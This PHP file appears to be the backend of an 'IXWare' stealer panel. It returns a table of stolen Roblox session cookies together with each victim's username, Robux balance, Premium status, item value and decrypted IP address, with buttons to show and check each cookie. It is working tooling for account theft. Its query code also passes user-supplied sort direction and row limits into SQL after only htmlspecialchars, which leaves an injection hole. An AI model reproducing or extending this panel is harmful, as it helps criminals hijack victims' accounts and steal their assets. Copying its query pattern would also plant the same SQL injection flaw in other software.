<?php
    ini_set('max_execution_time', '300'); //300 seconds = 5 minutes
    @session_start();
    include_once '../includes/functions.php';
    include_once '../includes/checks.php';
     
    header('Content-type: application/json; charset=UTF-8');

    if(isset($_SESSION['ID'])){

      $usedToken = pdoQuery($db, "SELECT `usedToken` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      if(!empty($usedToken) && $usedToken != '0'){
        $usedID = pdoQuery($db, "SELECT `id` FROM `users` WHERE `username`=?", [htmlspecialchars($usedToken)])->fetchColumn();

        $query = '';
        $query .= "SELECT * FROM `cookie_logs` WHERE `id`=? ";
        if(!empty($_POST["search"]["value"])){
          $query .= 'AND(`cookieName` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookieRobux` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookiePremium` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookieRolimons` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookieImage` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `ip` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `cookie` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `date` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%")';
        }
        if(!empty($_POST["order"])){
          $column = htmlspecialchars($_POST['order']['0']['column']);
          if($column == 0){
            $query .= ' ORDER BY `cookieImage` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }elseif($column == 1){
            $query .= ' ORDER BY `cookieName` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }elseif($column == 2){
            $query .= ' ORDER BY `cookieRobux`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }elseif($column == 3){
            $query .= ' ORDER BY `cookiePremium`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }elseif($column == 4){
            $query .= ' ORDER BY `cookieRAP`+0 '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }elseif($column == 5){
            $query .= ' ORDER BY `ip` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }elseif($column == 6){
            $query .= ' ORDER BY `date` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
          }
        }
        else{
          $query .= ' ORDER BY `date` DESC ';
        }

        if($_POST["length"] != -1){
          $query .= 'LIMIT ' . htmlspecialchars($_POST['start']) . ', ' . htmlspecialchars($_POST['length']);
        }
        $stmt = $db->prepare($query);
        $stmt->execute([htmlspecialchars($usedID)]); 
        $results = $stmt->fetchAll();
        $row = $stmt->rowCount();
        
        $nRows = htmlspecialchars(pdoQuery($db, "SELECT COUNT(*) FROM `cookie_logs` WHERE `id`=?", [htmlspecialchars($usedID)])->fetchColumn());
    
        $data = array();
        foreach($results as $result){
            $img = htmlspecialchars($result['cookieImage']);
            $cookieID = htmlspecialchars($result['cookieID']);
            $rolimons = htmlspecialchars($result['cookieRolimons']);
            $data[] = array(
                "Roblox Avatar" => "<img src='$img' alt='IXWare Picture' style='height:150px'></img>",
                "Roblox UserName" => htmlspecialchars($result['cookieName']),
                "Robux" => htmlspecialchars($result['cookieRobux']),
                "Premium" => htmlspecialchars($result['cookiePremium']),
                "RAP" => htmlspecialchars($result['cookieRAP']),
                "IP" => htmlspecialchars(decrypt($result['ip'])),
                "Log Date" => htmlspecialchars($result['date']),
                "Actions" => "<form method='POST'>
                <td scope=\"row\" style='word-break:break-all;'>
                  <div class='btn-group-vertical' role='group' aria-label='Vertical button group'>
                    <button type='submit' name='removeBot' value='bot' class='btn btn-outline-danger btn-sm bot-action-button bot-delete-button' data-ripple-color='dark'><i class='fas fa-trash-alt mr-2'></i>Delete</button>
                    <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$cookieID' id='checkCookie' data-ripple-color='dark'><i class='fas fa-cookie-bite mr-2'></i>Check Cookie</button>
                    <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$cookieID' id='showCookie' data-ripple-color='dark'><i class='fas fa-cookie-bite mr-2'></i>Show Cookie</button>
                    <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' onclick=\"window.open('$rolimons')\" data-ripple-color='dark'><i class='fas fa-cookie-bite mr-2'></i>Rolimons</button>
                  </div>
                </td>
                <input type=\"hidden\" name=\"robloxCookie\" value=\"$cookieID\" />
                </form>"
             );
        }
    
        $draw = htmlspecialchars($_POST['draw']);
        ## Response
        $response = array(
            "draw" => intval($draw),
            "recordsTotal" => $row,
            "recordsFiltered" => $nRows,
            "data" => $data
        );
    
        echo json_encode($response);
      }else{
          die("Hello");
      }
    }else{
      echo "Hi";
    }
?>